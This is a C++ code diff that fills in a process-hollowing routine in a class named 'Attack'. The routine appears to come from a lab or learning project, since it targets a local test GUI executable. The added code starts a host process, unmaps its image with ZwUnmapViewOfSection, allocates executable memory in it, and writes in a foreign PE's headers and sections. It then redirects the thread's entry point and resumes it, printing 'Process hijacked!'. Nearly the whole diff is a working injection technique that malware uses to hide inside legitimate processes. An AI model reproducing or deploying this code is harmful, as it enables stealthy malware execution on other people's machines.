@@ -343,6 +343,8 @@ PE_FILE ParsePE(const char* PE)
 
 BOOL ProcessReplacement(string inj_exe)
 {
+	const wchar_t *target_file = L"..\\..\\test_process_folder\\target-simple-gui.exe";
+
 	std::cout << "[ ] Opening binary to read into buffer" << std::endl;
 	tuple<bool, char*, fstream::pos_type> bin = OpenBinary(inj_exe);
 	std::cout << "[+] Opened binary" << std::endl;
@@ -366,7 +368,7 @@ BOOL ProcessReplacement(string inj_exe)
 	std::cout << "[ ] Creating host process" << std::endl;
 
 	CreateProcess(
-		L"..\\..\\test_process_folder\\target-simple-gui.exe",
+		target_file,
 		nullptr,
 		nullptr,
 		nullptr,
@@ -450,11 +452,123 @@ BOOL ProcessReplacement(string inj_exe)
 	std::cout << "[+] Parsed remote PEB" << std::endl;
 
 	// Remote image size calculation
+	auto BUFFER_SIZE = sizeof(IMAGE_DOS_HEADER) + sizeof(IMAGE_NT_HEADERS64) + (sizeof(IMAGE_SECTION_HEADER) * 100);
+	BYTE *remoteProcessBuffer = new BYTE[BUFFER_SIZE];
+	LPCVOID remoteImageAddressBase = pPEB->Reserved3[1]; // set forged process ImageBase to remote process' image base
 
+	std::cout << "[ ] Reading process memory to find process image" << std::endl;
+	// read process image from loaded process so we can replace
+	if (!ReadProcessMemory(remoteProcessInfo->hProcess,
+		remoteImageAddressBase,
+		remoteProcessBuffer,
+		BUFFER_SIZE,
+		nullptr))
+	{
+		return FALSE;
+	}
+	std::cout << "[+] Found remote process image" << std::endl;
+	// Get handle to unmap remote process sections for replacement
+	std::cout << "[ ] Loading remote call to unmap" << std::endl;
+
+	FARPROC fpZwUnmapViewOfSection = GetProcAddress(handleToRemoteNtDll, "ZwUnmapViewOfSection");
+	// Create callable version of remote unmap call
+	auto ZwUnmapViewOfSection = reinterpret_cast<_ZwUnmapViewOfSection>(fpZwUnmapViewOfSection);
+
+	// Unmap remote process image 
+	if (ZwUnmapViewOfSection(remoteProcessInfo->hProcess, const_cast<PVOID>(remoteImageAddressBase)))
+	{
+		std::cout << "[-] Failed to unmap remote process image" << std::endl;
+		return FALSE;
+	}
+	std::cout << "[+] Unmaped remote process image" << std::endl;
+
+	std::cout << "[!] Hijacking remote image" << std::endl;
+	std::cout << "[ ] Allocating memory in foreign process" << std::endl;
+	LPVOID hijackerRemoteImage = VirtualAllocEx(remoteProcessInfo->hProcess,
+		const_cast<LPVOID>(remoteImageAddressBase),
+		Parsed_PE.inh32.OptionalHeader.SizeOfImage,
+		MEM_COMMIT | MEM_RESERVE,
+		PAGE_EXECUTE_READWRITE);
+
+	if (!hijackerRemoteImage)
+	{
+		std::cout << "[-] Failed to allocate memory in remote process" << std::endl;
+		return FALSE;
+	}
+	std::cout << "[+] Allocated memory to remote process at 0x" << hijackerRemoteImage << std::endl;
+	// Calculate relocation delta
+	ULONGLONG dwDelta = ULONGLONG(remoteImageAddressBase) - Parsed_PE.inh32.OptionalHeader.ImageBase;
+
+	// Here we cast the new process to a function pointer that we will cause the remote process to execute
+	Parsed_PE.inh32.OptionalHeader.ImageBase = reinterpret_cast<ULONGLONG>(remoteImageAddressBase);
+
+	std::cout << "[ ] Writing hijack image to remote process" << std::endl;
+	if (!WriteProcessMemory(remoteProcessInfo->hProcess,
+		const_cast<LPVOID>(remoteImageAddressBase),
+		PE_FILE,
+		Parsed_PE.inh32.OptionalHeader.SizeOfHeaders,
+		nullptr))
+	{
+		std::cout << "[-] Failed to write new headers to remote process memory" << std::endl;
+		return FALSE;
+	}
+
+	for (WORD i = 0; i < Parsed_PE.inh32.FileHeader.NumberOfSections; i++)
+	{
+		PVOID VirtAddress = PVOID(reinterpret_cast<ULONGLONG>(remoteImageAddressBase) + Parsed_PE.ish[i].VirtualAddress);
+
+		if (!WriteProcessMemory(remoteProcessInfo->hProcess,
+			VirtAddress,
+			Parsed_PE.Sections[i].get(),
+			Parsed_PE.ish[i].SizeOfRawData,
+			nullptr))
+		{
+			std::cout << "[-] Failed to write one of the new processes" << std::endl;
+			return FALSE;
+		}
+	}
+
+	std::cout << "[+] Wrote process memory" << std::endl;
+	std::cout << "============================================" << std::endl;
+
+	auto dwEntryPoint = reinterpret_cast<ULONGLONG>(remoteImageAddressBase) + Parsed_PE.inh32.OptionalHeader.AddressOfEntryPoint;
+	std::cout << "==========Hijacking Remote Process=========" << std::endl;
+	std::cout << "[ ] Saving debugging context of process" << std::endl;
+	LPCONTEXT remoteProcessContext = new CONTEXT(); // debugging structure to hold the old process context
+	remoteProcessContext->ContextFlags = CONTEXT_FULL;
+
+	if (!GetThreadContext(remoteProcessInfo->hThread, remoteProcessContext))
+	{
+		std::cout << "[-] Failed to get debugging context" << std::endl;
+		return FALSE;
+	}
+	std::cout << "[+] Saved process context" << std::endl;
+
+	std::cout << "[*] Modifying proc context ECX->EntryPoint()" << std::endl;
+	remoteProcessContext->Ecx = (DWORD)dwEntryPoint; // Set ECX or RCX register to the Entrypoint
+
+	std::cout << "[ ] Restoring modified content at 0x" << remoteProcessContext->Ecx << std::endl;
+	if (!SetThreadContext(remoteProcessInfo->hThread, remoteProcessContext) &&
+		!GetThreadContext(remoteProcessInfo->hThread, remoteProcessContext))
+	{
+		std::cout << "[-] Failed to set remote process context && set control thread context" << std::endl;
+		return FALSE;
+	}
+	std::cout << "[+] Restored process context" << std::endl;
+
+	if (!ResumeThread(remoteProcessInfo->hThread))
+	{
+		std::cout << "[-] Failed to resume remote process" << std::endl;
+		return FALSE;
+	}
+
+	std::cout << "[!] Process hijacked!" << std::endl;
+
+	CloseHandle(remoteProcessInfo->hProcess);
 	return TRUE;
 }
 
-BOOL Attack::ProcReplace(string arg1)
+BOOL Attack::ProcReplace(string inj_exe)
 {
-	return ProcessReplacement(arg1);
+	return ProcessReplacement(inj_exe);
 }
